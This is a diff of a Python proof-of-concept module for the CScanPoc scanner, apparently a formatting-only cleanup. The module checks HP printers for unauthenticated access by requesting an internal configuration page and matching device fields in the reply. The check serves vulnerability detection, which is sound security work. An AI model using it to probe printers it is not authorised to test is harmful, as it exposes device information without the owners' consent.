@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'HP_0001'  # 平台漏洞编号，留空
     name = 'HP多款打印机 未授权访问'  # 漏洞名称
     level = VulnLevel.LOW  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2015-03-25'  # 漏洞公布时间
     desc = '''
         惠普多款打印机设备未设置权限访问，可以直接看到详细的使用信息等，还可以直接选着打印。
@@ -18,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '惠普'  # 漏洞应用名称
     product_version = '惠普款打印机'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'f1debf59-4cb8-46f7-a063-a68e43a1b82b'
@@ -32,15 +35,15 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer     :  http://www.wooyun.org/bugs/wooyun-2015-0103446
+            # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0103446
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = "/hp/device/InternalPages/Index?id=ConfigurationPage"
             target = arg + payload
             code, head, res, errcode, _ = hh.http(target)
 
-            if code ==200 and 'HomeDeviceName' in res and 'HomeDeviceIp' in res:
-                #security_hole(target)
+            if code == 200 and 'HomeDeviceName' in res and 'HomeDeviceIp' in res:
+                # security_hole(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -49,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
